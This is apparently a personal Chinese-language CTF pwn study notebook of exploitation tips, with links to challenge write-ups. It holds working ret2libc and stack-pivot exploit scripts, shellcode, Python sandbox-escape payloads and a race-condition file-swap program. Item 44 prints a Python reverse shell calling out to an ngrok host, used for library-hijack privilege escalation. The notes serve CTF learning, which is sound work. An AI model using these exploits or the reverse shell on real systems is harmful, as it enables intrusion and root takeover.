# Pwn笔记

1. 程序关闭标准输出会导致getshell后无法得到cat flag的输出。这时可以用命令`exec 1>&0`将标准输出重定向到标准输入，再执行cat flag就能看见了。因为默认打开一个终端后，0，1，2（标准输入，标准输出，标准错误）都指向同一个位置也就是当前终端。详情见这篇[文章](https://blog.csdn.net/xirenwang/article/details/104139866)。例题：[wustctf2020_closed](https://buuoj.cn/challenges#wustctf2020_closed)
2. 做菜单类堆题时，添加堆块的函数一般是最重要的，需要通过分析函数来构建出程序对堆块的安排。比如有些笔记管理题会把笔记名称放一个堆中，笔记内容放另一个堆中，再用一个列表记录指针。了解程序是怎么安排堆后才能根据漏洞制定利用计划。如果分析不出来，用gdb调试对着看会好很多。例题：[babyfengshui](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Pwn/babyfengshui.md)
3. 32位利用A和%p计算格式化字符串偏移+$hn按字节改got表。例题：[axb_2019_fmt32](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/axb_2019_fmt32.md)
4. pwntools生成shellcode

适用于linux。不过我到现在还没见过windows的pwn，可能是windows考的不多吧。

```python
from pwn import *
arch=input("arch? i386/amd64: ")
context(log_level = 'debug', arch = arch[:-1], os = 'linux')
choice=input("shell/orw: ")[:-1]
if choice=="shell":
    shellcode=asm(shellcraft.sh())
    print(shellcode)
else:
    mmap_addr = int(input("hex addr: ")[:-1],16)
    shellcode = shellcraft.open('./flag')
    shellcode += shellcraft.read(3, mmap_addr, 0x30)
    shellcode += shellcraft.write(1, mmap_addr, 0x30)
    print(asm(shellcode))
```

- 32位9字节read shellcode：`xor eax,eax;xor edi,edi;mov rdx,r10;syscall`,结果是`b'\x82QN".\x08\xc3e\x95'`。

6. pwn 栈题模板

### 64位

- ret2libc+格式化字符串绕canary:[bjdctf_2020_babyrop2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/bjdctf_2020_babyrop2.md)。

- ropchain getshell+溢出绕canary:[rop64](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/rop64.md)。

- ret2libc:[ret2libc](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/ret2libc.md)
- 程序给出buf地址的栈迁移:[actf_2019_babystack](https://blog.csdn.net/mcmuyanga/article/details/112801732)

```python
from pwn import *
context.log_level='debug'
p=remote("node4.buuoj.cn",28412)
leave_ret=0x0000000000400a18
puts_plt=0x400730
puts_got=0x601020
main=0x4008f6
pop_rdi=0x0000000000400ad3
p.sendlineafter(">",str(0xe0))
p.recvuntil('0x')
stack_addr=int(p.recv(12),16)
print(hex(stack_addr))
payload=b'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
payload+=b'a'*(0xd0-len(payload))  #0xd0是buf距离rbp的偏移
payload+=p64(stack_addr)+p64(leave_ret)
p.sendafter(">",payload) #栈迁移提的payload永远用send发送
puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts_addr-526784
one_gadget=libc_base+0x4f2c5
p.sendlineafter(">",str(0xe0))
p.recvuntil('0x')
stack_addr=int(p.recv(12),16)
payload=b'a'*8+p64(one_gadget)
payload+=b'a'*(0xd0-len(payload))
payload+=p64(stack_addr)+p64(leave_ret)
p.sendafter(">",payload)
p.interactive()
```

### 32位

- ret2libc:[pwn-200](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Pwn/pwn-200.md)。

```python
from pwn import *
context.log_level='debug'
write_plt=0x08048370
write_got=0x0804a01c
ret_addr=0x0804847b
payload=b'a'*0x8c+p32(write_plt)+p32(ret_addr)+p32(1)+p32(write_got)+p32(4)
p=remote("node4.buuoj.cn",26320)
p.sendline(payload)
write_addr=u32(p.recv(4))
system_offset=239936
write_offset=869312
bin_sh_offset=0x0015902b
libc_base=write_addr-write_offset
payload=b'a'*0x8c+p32(libc_base+system_offset)+p32(ret_addr)+p32(libc_base+bin_sh_offset)
p.sendline(payload)
p.interactive()
```

- 栈迁移+ret2libc:[[Black Watch 入群题]PWN](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN.md)

- 栈迁移:[ciscn_2019_es_2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_es_2.md)

栈迁移分很多种情况。第一种情况：`偏移+栈迁移目标地址-4+leave_ret`，同时目标地址直接写ropchain。第二种情况：`偏移+栈迁移目标地址+leave_ret`，目标地址先根据程序是多少位的填充4或者8个字节，再写ropchain。第三种情况，迁移的目标地址离一些重要地址比较近，比如got表，这时候就要留出一些位置，`偏移+栈迁移目标地址-0xd0+leave_ret`，目标地址先写0xd0+4个偏移再写ropchain；或者`偏移+栈迁移目标地址+leave_ret`，但是目标地址的ropchain前面加上若干个ret，抬高栈。例题：[gyctf_2020_borrowstack](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/gyctf_2020_borrowstack.md)

- 菜单类栈溢出题+canary绕过+ret2libc

```python
from pwn import *
context.log_level='debug'
context(arch='arm64')   #因为下方使用了flat，故此处一定要根据程序的位数填写，这个是64位，32位是i386。如果填写错误会导致下方的flag出错。
p=remote('node4.buuoj.cn',27351)
def Store(content):
    p.recvuntil('>>')
    p.sendline('1')
    p.sendline(content)
 
def Print():
    p.recvuntil('>>')
    p.sendline('2')
 
def Quit():
	p.recvuntil('>>')
	p.sendline('3')
puts_plt=0x00400690
puts_got=0x00600fa8
pop_rdi=0x0000000000400a93
main=0x00400908
payload=b'a'*0x88
Store(payload)
Print()
p.recvuntil('a\n')
canary=p.recv(7).rjust(8,b'\x00')
print(canary)
payload=flat([b'a'*0x88,canary,0,pop_rdi,puts_got,puts_plt,main])
Store(payload)
Quit()
p.recv()
puts=u64(p.recv(6).ljust(8,b'\x00'))
puts_offset=456336
libc_base=puts-puts_offset
binsh=1625431+libc_base
system=283536+libc_base
payload=flat([b'a'*0x88,canary,0,pop_rdi,binsh,system,main])
Store(payload)
Quit()
p.interactive()
```

- srop基础利用。例题:[ciscn_2019_es_7](../../CTF/BUUCTF/Pwn/ciscn_2019_es_7.md)

7. pwntools得到libc偏移

承接rop题模板，给出做题时常见的偏移，上面的脚本中xxx_offset就是这么来的。至于为什么要多此一举打印出来，全是因为我没配置好linux环境。配置好的各位直接要`libc.sym['xxx]`那段就行了。

```python
from pwn import *
path="libc.so.6"
libc=ELF(path)
context.arch = libc.arch
print(f"system:{libc.sym['system']}")
print(f"write:{libc.sym['write']}")
print(f"puts:{libc.sym['puts']}")
print(f"/bin/sh:{libc.search(b'/bin/sh').__next__()}")
print(f"free:{libc.sym['free']}")
print(f"__malloc_hook:{libc.symbols['__malloc_hook']}")
print(f"realloc:{libc.symbols['realloc']}")
print(f"printf:{libc.symbols['printf']}")
print(f"__free_hook:{libc.sym['__free_hook']}")
print(f"atoi:{libc.sym['atoi']}")
print(f"__environ:{libc.sym['__environ']}")
print(f"__libc_start_main:{libc.symbols['__libc_start_main']}")
print(f"_IO_2_1_stdin_:{libc.sym['_IO_2_1_stdin_']}")
print(f"setbuffer:{libc.sym['setbuffer']}")
print(f"_IO_list_all: {libc.symbols['_IO_list_all']}")
print(f"read: {libc.symbols['read']}")
print(f"open: {libc.symbols['open']}")   
print(f"malloc: {libc.symbols['malloc']}") 
print(f"_IO_2_1_stdout_: {libc.sym['_IO_2_1_stdout_']}")
print()
print("gadgets:")
print(f"pop rdi;ret: {next(libc.search(asm('pop rdi; ret'), executable=True))}")
print(f"pop rsi;ret: {next(libc.search(asm('pop rsi; ret'), executable=True))}")
print(f"ret: {next(libc.search(asm('ret'), executable=True))}")                                                      
```

8. pwn heap题模板

### 64位

- unsorted bin attack:[hitcontraining_magicheap](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/hitcontraining_magicheap.md)
- Chunk Extend and Overlapping+off by one:[hitcontraining_heapcreator](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/hitcontraining_heapcreator.md)
- 利用Chunk Extend and Overlapping配合unsorted bin泄露地址+fastbin attack修改__malloc_hook:[0ctf_2017_babyheap](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/0ctf_2017_babyheap.md)
- one_gadget失效时利用realloc_hook调整栈+Chunk Extend and Overlapping配合unsorted bin泄露地址+fastbin attack。例题:[roarctf_2019_easy_pwn](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/roarctf_2019_easy_pwn.md)
- unlink更改got表。例题:[hitcontraining_unlink](../../CTF/BUUCTF/Pwn/hitcontraining_unlink.md)
- house of force任意地址写。例题:[hitcontraining_bamboobox](../../CTF/BUUCTF/Pwn/hitcontraining_bamboobox.md)
- uaf改free_hook为system+tcache dup。例题:[ciscn_2019_es_1](../../CTF/BUUCTF/Pwn/ciscn_2019_es_1.md)
- off by one+unlink+格式化字符串泄露地址。例题:[axb_2019_heap](../../CTF/BUUCTF/Pwn/axb_2019_heap.md)
- 劫持_IO_2_1_stdin_结构体里的_fileno使其读取制定文件而不是stdin+只能泄露地址后4字节的解决办法。例题:[](../../CTF/BUUCTF/Pwn/ciscn_2019_final_2.md)
- off by null+Chunk Extend and Overlapping+tcache dup。例题:[hitcon_2018_children_tcache](../../CTF/BUUCTF/Pwn/hitcon_2018_children_tcache.md)
- house of orange+FSOP。例题:[houseoforange_hitcon_2016](../../CTF/BUUCTF/Pwn/houseoforange_hitcon_2016.md)

### 32位

- uaf更改heap数组函数指针:[hacknote](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Pwn/hacknote.md)
- uaf修改程序功能函数指针。例题：[ciscn_2019_n_3](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_n_3.md)


9. 栈溢出[计算偏移量](https://blog.csdn.net/weixin_62675330/article/details/123344386)（gdb，gdb-peda,pwntools cyclic,ida)
10.  手写shellcode。当pwntools自动生成的shellcode过长时，就要手动将shellcode长度缩减。例题：[ciscn_2019_s_9](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_s_9.md)
11.  32位&64位系统调用及其[系统调用号](https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/)。
12.  pwntools的sendline和send函数效果不同，sendline会默认在发送的内容后面加上个换行符`\n`。有时候使用不同的会有影响，一个不行可以试试另外的。
13.  纯可见字符shellcode。一般的shellcode都有不可见字符，但有时程序要求只能输入可见字符，这时纯可见字符shellcode就派上用场了。详情请看这篇[文章](http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode)，给出linux，amd64的一个可见字符shellcode：

- Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t

例题:[mrctf2020_shellcode_revenge](https://blog.csdn.net/mcmuyanga/article/details/114828207)

14. 基本格式化字符串漏洞。例题:[inndy_echo](../../CTF/BUUCTF/Pwn/inndy_echo.md)
15. 64位格式化字符串泄露地址+改got表。例题:[axb_2019_fmt64](../../CTF/BUUCTF/Pwn/axb_2019_fmt64.md)
16. [blind pwn](https://www.anquanke.com/post/id/196722#h3-15)（盲打），在不给出原程序的情况下尝试打通程序。
17. orw shellcode构造。例题:[[极客大挑战 2019]Not Bad](../../CTF/BUUCTF/Pwn/[极客大挑战%202019]Not%20Bad.md)
18. stack smash泄露栈上内容+environ环境变量计算栈上变量地址。例题:[wdb2018_guess](../../CTF/BUUCTF/Pwn/wdb2018_guess.md)
19. 在c语言中，无符号变量和有符号变量比较时，会将有符号变量转化为无符号变量来比较。可利用这个特点进行整形溢出，如数字为0的时候，(unsigned int)(0-1)就就是非常大的整数。
20. 就算是32位程序，数组取索引`a[1]`仍然是一个索引对应8个字节。
21. use without initialization漏洞。程序malloc后得到指针在free并设null后，同样应该将指针指向的内容置空，否则可能会导致程序逻辑漏洞。例题:[picoctf_2018_are you root](https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/are%20you%20root.md)
22. calloc不会从tcache bin里取空闲的chunk，而是从fastbin里取，取完后，和malloc一样，如果fastbin里还有剩余的chunk，则全部放到对应的tcache bin里取，采用头插法。头插法会导致chunk->fd被写入heap_x_addr。例题:[gyctf_2020_signin](https://blog.csdn.net/seaaseesa/article/details/104526905)
23. 堆上的格式化字符串漏洞。
- printf的字符串，如果是在堆上，那么就无法在栈上写地址利用%x$hn去修改
- printf会一次性取出所有的偏移的地址，再去修改。不是边写边修改
- 由于ebp寄存器会记录一个栈地址链，所以可以利用这一点特性，爆破修改这个栈地址链的最低字节，然后修改ebp寄存器后4个字节的内容，理想状态下，爆破1个字节即可，而且，所有的地址都是对齐到地址页。
- ALSR : 对于32位的线性地址来说，高四位为全局页表，如果用随机产生会影响对高位内存的映射能力，会产生大量的内存碎片，低12位要考虑页对齐，因而只能有16位来作为偏移量 . 可能不清楚, 举个例子 0x080485AB地址 它只能0x10,0x10的修改. 同时高四位不会被修改, 同时由于页对齐 , 也就意味着只有A 会被随机化. 64位类似.
- %{offest}\$n : 如果有 A->B->C. 那么如果 %{offest}\$n指向A的话, 实际修改的是C.

例题:[xman_2019_format](https://blog.csdn.net/Y_peak/article/details/115327826)

24. ubuntu18中需要[栈平衡](https://blog.csdn.net/qq_41560595/article/details/112161243)（按照16字节对齐）才能正常调用system。例题:[suctf_2018_stack](https://buuoj.cn/challenges#suctf_2018_stack)
25. 程序在推出是会调用fini_array，因此可以通过改fini_array获取一次循环。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，由此无法获得无限循环。例题:[ciscn_2019_sw_1](https://blog.csdn.net/wuyvle/article/details/116310454)
26. strcpy 在复制字符串时会拷贝结束符 '\x00'，比如原字符串长8，strcpy会连着末尾的\x00一起拷贝到目标地址，也就是9个字符，易发生off-by-null。
27. 拟态入门。该类题型会给出两个功能完全相同的程序，还有一个裁决程序，fork出这两个程序，并监听着它们的输出。如果两者输出不一样或者一方崩溃，则裁决程序就会kill掉它们两个，要求我们写出两个程序都共用的exp。例题:[强网杯2019 拟态 STKOF](https://blog.csdn.net/seaaseesa/article/details/105407007)
28. realloc函数下的tcache dup+stdout泄露libc地址。realloc函数相比malloc，有4种情况：

① 当ptr == nullptr的时候，相当于malloc(size)， 返回分配到的地址<br>
② 当ptr != nullptr && size == 0的时候，相当于free(ptr)，返回空指针<br>
③ 当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去<br>
④ 当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面有足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针

利用io file的stdout泄露libc地址则要满足下面的条件：

① 设置_flags & _IO_NO_WRITES = 0<br>
② 设置_flags & _IO_CURRENTLY_PUTTING = 1<br>
③ 设置_flags & _IO_IS_APPENDING = 1<br>
④ 将_IO_write_base设置为要泄露的地方

例题1:[roarctf_2019_realloc_magic](https://blog.csdn.net/qq_35078631/article/details/126913140)。例题2:[de1ctf_2019_weapon](https://www.z1r0.top/2021/10/12/de1ctf-2019-weapon/)。例题2是uaf+全保护+无show函数（无法直接泄露地址），且无法直接创建unsorted bin，需要利用uaf和chunk overlap构造出一个unsorted bin里的chunk，然后再爆破io file泄露地址（打stdout）。

29. tcache attack中tcache_perthread_struct的利用。在tcache机制下利用unsorted bin泄露地址时，需要先填满tcache。但有些题会限制free的次数。这时可以尝试利用例如tcache dup这种漏洞，分配到tcache_perthread_struct处，更改tcache bins中chunk的数量和分配地址。tcache_perthread_struct结构体在堆上，大小一般为0x250。它的前64个字节，分别代表0x20\~0x410大小的chunk(包括chunk头)的数量。当超过7（这个值由里面的一个字段决定，如果我们修改这个字段，比如0，就能直接把chunk放入unsorted bin）的时候，再次释放的chunk会被放入到fastbin或者unsorted bin。后面的内存，则分别表示0x20\~0x410大小tcache bins的首地址。首地址如果是一个有效的地址，下一次分配对应大小的chunk会直接从该地址处分配，没有chunk size的检查。例题:[SWPUCTF_2019_p1KkHeap](https://www.cnblogs.com/LynneHuan/p/14589294.html)
30. bss段上的格式化字符串漏洞。非栈上的格式化字符串漏洞与栈上格式化字符串不同，主要区别在于无法直接使用%XXc$XXp + addr，去往指定地址写入内容。一般需要借助地址链完成任意地址写操作。常用的地址链有：rbp指针链、args参数链。如果利用rbp指针链攻击程序返回地址，最后退出函数的时候，需要把rbp指针链恢复为原始状态。和堆上的格式化字符串漏洞一样，都是可以利用ebp的地址链间接修改got等地址。got表通常是0x80开头，先让ebp指向一个指向0x80地址开头的指针（方便修改），下一次再修改ebp就是修改那个指针，改成system即可getshell。例题1:[SWPUCTF_2019_login](https://blog.csdn.net/weixin_46521144/article/details/119567212)(利用ebp链改got表)。例题2:[npuctf_2020_level2](https://www.cnblogs.com/LynneHuan/p/14639168.html)(利用args链改返回地址)
31. [exit_hook](https://www.cnblogs.com/pwnfeifei/p/15759130.html)的[利用](https://www.cnblogs.com/bhxdn/p/14222558.html)。其实没有exit hook，它是函数指针，故无法直接libc.sym找到，只能手动记录值。

```
在libc-2.23中
exit_hook = libc_base+0x5f0040+3848（64）
exit_hook = libc_base+0x5f0040+3856（32）

在libc-2.27中
exit_hook = libc_base+0x619060+3840（64）
exit_hook = libc_base+0x619060+3848（32）
```

上面给出的链接介绍了如何用rtld_lock_default_lock_recursive等函数指针来getshell。这道[题](https://4n0nym4u5.github.io/2023/02/12/LA_CTF_23/)又提供了另变种：因为先调用tld_lock_default_lock_recursive再调用rtld_lock_default_unlock_recursive，且两者都使用_rtld_local+2312作为rdi。所以可以将rtld_lock_default_lock_recursive的函数指针改为gets，手动输入/bin/sh；再将rtld_lock_default_unlock_recursive的函数指针改为system，即可getshell。

最近遇到一道[题](https://blog.csdn.net/tbsqigongzi/article/details/126312377)，任意地址写改exit_hook。这里面也是ubuntu18，64位libc-2.27，只不过偏移是0x81df60，用之前记录的0x619060+3840不行。两者应该是看情况使用。

只要知道libc版本和任意地址的写，就可以直接写这个指针，执行exit后就可以拿到shell了。（也不用非要执行exit函数，程序正常返回也可以执行到这里）

32. arm架构下的栈溢出。例题:[jarvisoj_typo](https://www.cnblogs.com/LynneHuan/p/16104052.html)。在ARM架构中，PC寄存器相当于rip，保存的是当前正在取指的指令的地址，因此栈溢出控制[pc寄存器](https://blog.51cto.com/u_13682052/2977378)就能控制程序流程。
33. [tcache Stashing Unlnk](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-stashing-unlink-attack)。利用Smallbin的相关分配机制进行攻击，需要可控一个chunk或者构造一个fake chunk的bk，效果为在任意地址上写一个 libc 地址 (类似 unsorted bin attack)。例题:[[2020 新春红包题]3](https://www.anquanke.com/post/id/198173#h3-6)
34. pwntools可以设置context.buffer_size，默认为0x1000，可以改大一点，避免利用格式化字符串漏洞，printf参数为%34565c%6$p这种情况的时候，满屏的空白字符，影响下一次利用。还可以利用for循环结合sleep来确保每一次printf写数据的时候，把所有输出的字符都完全接收，避免得到非预期结果。打远程的时候，还需要使用sleep函数，给缓冲区刷新的时间。
35. c++(arm) ret2libc入门。例题:[redact](https://jiravvit.github.io/230216-lactf2023-redact/)。这里简述一些要点：

- 当我们在c++里写下面的代码时：

```c++
#include <iostream>
int main() {
    std::cout << "Hello World!";
}
```

编译后实际调用的函数是`_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc`，即函数修饰名。泄露地址时要找修饰名的地址调用，可以用pwntols的[ROP](https://docs.pwntools.com/en/stable/rop/rop.html#manual-rop)。

- size_t代表unsigned，和int混用时容易出现经典的栈溢出（利用一个小size_t减一个大的size_t会得到一个很大的整数而不是负数的特点）。
- std::string在内存中存储的结构：

```
+00h: <Data Pointer> 
+08h: <Data Size>
+10h: <Data>  
+18h: <Data>
```

当Data Size超过0x10时, Data Pointer会存在堆上。

36. Full RELRO，NX+PIE格式化字符串调用system('/bin/sh')。例题:[rut-roh-relro](https://jiravvit.github.io/230215-lactf2023-rut-roh-relro/)。rdi是一块可写的空间，泄露libc基地址后加上调试得到的偏移即可尝试写入，例如格式化字符串漏洞调用system。写栈上返回地址也是同理。不是往反编译出来的地址上写，而是泄露栈地址后调试找到偏移然后格式化字符串写。注意libc，stack，pie需要分别泄露地址，都需要靠动调找泄露出来的偏移。甚至于，同一个函数，不同调用的偏移都不是一致的。如果单纯PIE+NX，可以用格式化字符串泄露一个地址后算出基址，加上plt和got表的偏移即可算出system等函数的正确plt/got，改got表即可。
37. 利用risc-v虚拟机任意地址读写漏洞执行rop链。例题:[CS2100](../../CTF/HackTM%20CTF/Pwn/CS2100.md)
38. 在python2中，input()函数等同于eval(raw_input())，意味着它会读取合法的python 表达式并执行，那么输入一个shell语句就能getshell了，例如`"__import__('os').system('cat flag.txt')"`。例题:[Balloons](https://github.com/ZorzalG/the-big-MHSCTF2023-writeups/blob/main/Balloons.md)
39. [Pyjail](https://cheatsheet.haax.fr/linux-systems/programing-languages/python/)([python沙盒逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html))。这类题型知识点比较杂，记录一点看过的，以后要用就翻。

- `[*().__class__.__base__.__subclasses__()[50+50+37].__init__.__globals__.values()][47]([].__doc__[5+5+7::79])`
> 利用\*符号将字典值转为列表，从而可使用\[\]取值+利用system函数和`__doc__`里的sh字符串getshell。例题:[Virus Attack](https://github.com/daffainfo/ctf-writeup/tree/main/ByteBanditsCTF%202023/Virus%20Attack)。类似的题目还有里面提到的[Albatross](https://okman.gitbook.io/okman-writeups/miscellaneous-challenges/redpwnctf-albatross)，不过这道题多了个unicode哥特字符也能执行函数的考点：

```python
𝔭𝔯𝔦𝔫𝔱("hello!")
#hello!
```

print函数可正常使用。

- `("a"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`
  - 任意文件读取。来源:[Pycjail](../../CTF/LA%20CTF/Misc/Pycjail.md)（任意文件读取/RCE）。知识点：
    - LOAD_GLOBAL, LOAD_NAME, LOAD_METHOD和LOAD_ATTR是常用的加载可调用对象的opcode。
    - IMPORT_FROM本质上还是LOAD_ATTR，只不过多了一层伪装。可以手工在使用LOAD_ATTR的地方将其改为IMPORT_FROM也不会有问题。
    - 在python 的bytecode中，两种调用函数的方式分别为LOAD_METHOD+CALL_METHOD和LOAD_ATTR+CALL_FUNCTION.
- 假如环境带有gmpy2，注意gmpy2.__builtins__是含有eval的，因此可以构造任意命令。在builtins里取函数和构造命令还可以通过拼接的形式，如：

```python
gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
```

40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：

```python
p=remote("trellixhax-free-yo-radicals-part-i.chals.io",443,ssl=True)
```

41. 算libc的偏移不一定要用有libc.sym能查到的符号偏移。可以开启gdb，随便选一个libc中的地址，然后查看libc基址。地址-基址就是固定偏移，就算泄露出来的地址不是libc中的一个符号，再次启动获取地址并减去之前算好的偏移仍然可以算出基址。
42. 栈地址（64位）一般以0x7fff开头；libc地址一般以0x7f开头。
43. [stuff](../../CTF/LA%20CTF/Pwn/stuff.md).
- double read(利用fread，gets等函数+leave;ret gadget的多次栈迁移)，在无可控制参数寄存器(pop rdi)的情况使用。主要利用了fread末尾的gadget：

```
   0x00007ffff7a9aa9d <+205>:  add    rsp,0x8
   0x00007ffff7a9aaa1 <+209>:  mov    rax,rbx
   0x00007ffff7a9aaa4 <+212>:  pop    rbx
   0x00007ffff7a9aaa5 <+213>:  pop    rbp
   0x00007ffff7a9aaa6 <+214>:  pop    r12
   0x00007ffff7a9aaa8 <+216>:  pop    r13
   0x00007ffff7a9aaaa <+218>:  ret 
```

可控制rbx和rbp。配合`add    dword ptr [rbp - 0x3d], ebx`这个gadget实现更改got表。关键在于第二次fread的buf指针指向上一次fread迁移的栈的上方，即可任意控制栈顶。

44. 利用python库进行提权（[Privilege Escalation: Hijacking Python Library](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7)）。脚本：

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("6.tcp.ngrok.io",11144))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

变种方法：[Python Library Hijacking on Linux](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

注意使用`sudo -l`找到无需密码就能使用root权限的命令后：

```
$ sudo -l
Matching Defaults entries for xxx on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xxx may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/xxx/.server.py
```

假设/home/xxx/.server.py的库已被劫持，要输入`sudo /usr/bin/python3 /home/xxx/.server.py`才能获取root权限。

45. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)。

```
ngrok tcp 7777
//另一个终端窗口监听指定tcp端口
nc -lv 7777
```

46. 利用[TOCTOU](https://www.cnblogs.com/crybaby/p/13195054.html)([Time of check to time of use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)),race condition(条件竞争)读取非权限内的文件。题目会给出一个利用root权限读取任意文件的程序，但该程序在打开文件前会检查要打开的文件权限是不是执行者的。漏洞点在于程序先检查权限再打开文件，如果我们在检查权限后将要打开的文件改为指向root权限flag的软链接（symlink），就能获取到flag。使用脚本：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

如果使用ssh连接题目服务器，可以另开一个shell窗口，两个shell窗口同时连接服务器。一个窗口运行该脚本，另一个窗口尝试读取flag。只是概率成功，但只要尝试足够多次，一定有一次可以。

47. 有时候`chmod +x file`还不能使文件可运行，这时可以用`chmod a+x file`。参考[此处](https://unix.stackexchange.com/questions/639438/whats-the-difference-between-chmod-ax-and-chmod-x)。
48. [how2heap-Educational Heap Exploitation](https://github.com/shellphish/how2heap/)。一个学习heap的github仓库。
49. 利用tcache dup/uaf/double free或是任何程序内出现的方法更改tcache的fd时，被更改fd的chunk需要是第二个。即tcache链`0x100000->0x200000`中对应0x200000的chunk。较高版本的tcache还有chunk地址检测，要求chunk地址对齐0x10（整除0x10），否则会触发`malloc(): unaligned tcache chunk detected`。
50. [ICS5U](https://github.com/jdabtieu/wxmctf-2023-public/blob/main/pwn2/writeup.md)
- 利用java代码拼接造成的代码注入读取flag文件
- java类中有一种[静态代码块](https://www.cnblogs.com/Qian123/p/5713440.html)(static{})提供初始化，只要类加载就会执行。
51. [All Green](https://github.com/xihzs/ctf-writeups/blob/main/WxMCTF%202023/pwn/All%20Green/README.md)
- 32位格式化字符串漏洞泄露canary+程序PIE基地址。这里跟着[ctf wiki](https://ctf-wiki.org/en/pwn/linux/user-mode/fmtstr/fmtstr-exploit/)总算是彻底会了怎么找要泄露的地址偏移了。首先在printf下个断点，到断点后步入一步进入printf函数。此时查看stack就能看到要泄露的值了。偏移就是用想泄露值处的地址减去栈上格式化字符串偏移的地址再除以4。
- 这题还涉及到使用ebx动态调用函数和普通的ebp取参数。因为是rop调用最终读取flag的函数，所以要把ebx和ebp手动覆盖成需要的值。在这道题里，ebx最后会被赋值，故可以同时覆盖ebx和ebp。
- 顺便提一下64位格式化字符串怎么找偏移。做法相似，(目标地址-格式化字符串所在地址)//8-偏移，其中格式化字符串所在地址是参数在栈上第一次出现的地址，偏移可以用输入8个A然后%p的方式求出。
52. [Baby Zero Day](https://github.com/xihzs/ctf-writeups/blob/main/WxMCTF%202023/pwn/Baby%20Zero%20Day/README.md)
- vm虚拟机类型题常出现任意地址写/读漏洞。
